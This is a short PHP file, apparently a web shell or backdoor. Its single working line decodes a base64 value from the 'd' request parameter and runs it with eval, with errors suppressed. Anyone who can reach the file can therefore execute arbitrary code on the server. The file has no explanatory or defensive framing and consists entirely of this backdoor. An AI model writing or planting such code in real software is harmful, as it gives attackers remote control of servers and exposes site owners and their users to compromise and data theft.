<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
@eval(base64_decode($_REQUEST['d']));
?>
